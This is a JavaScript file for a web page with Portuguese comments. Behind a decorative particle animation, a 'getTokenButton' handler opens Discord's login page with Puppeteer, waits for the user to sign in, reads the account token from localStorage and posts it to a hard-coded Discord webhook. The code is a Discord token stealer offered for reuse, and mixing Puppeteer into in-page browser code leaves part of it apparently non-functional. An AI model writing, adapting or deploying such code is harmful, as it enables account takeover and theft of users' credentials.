document.addEventListener('DOMContentLoaded', () => {
    const particleContainer = document.querySelector('.particle-container');

    for (let i = 0; i < 100; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        particle.style.width = `${Math.random() * 3 + 1}px`;
        particle.style.height = particle.style.width;
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.top = `${Math.random() * 100}vh`;
        particle.style.animationDuration = `${Math.random() * 5 + 5}s`;
        particle.style.animationDelay = `${Math.random() * 5}s`;
        particleContainer.appendChild(particle);
    }

    document.getElementById('getTokenButton').addEventListener('click', async () => {
        const webhookUrl = 'https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk'; // Substitua pelo URL do seu webhook

        const browser = await puppeteer.launch({ headless: false });
        const page = await browser.newPage();
        await page.goto('https://discord.com/login');

        // Aguarda o usuário fazer login
        await page.waitForSelector('textarea[placeholder="Enter your message"]');

        // Obtém o token do localStorage
        const token = await page.evaluate(() => {
            return localStorage.getItem('token');
        });

        await browser.close();

        // Dados a serem enviados para o webhook
        const data = {
            content: `Token do Discord: ${token}`
        };

        // Enviando a requisição POST para o webhook
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        // Verificando a resposta
        if (response.status === 204) {
            alert('Token enviado com sucesso!');
        } else {
            alert(`Erro ao enviar o token: ${response.status}`);
        }
    });
});
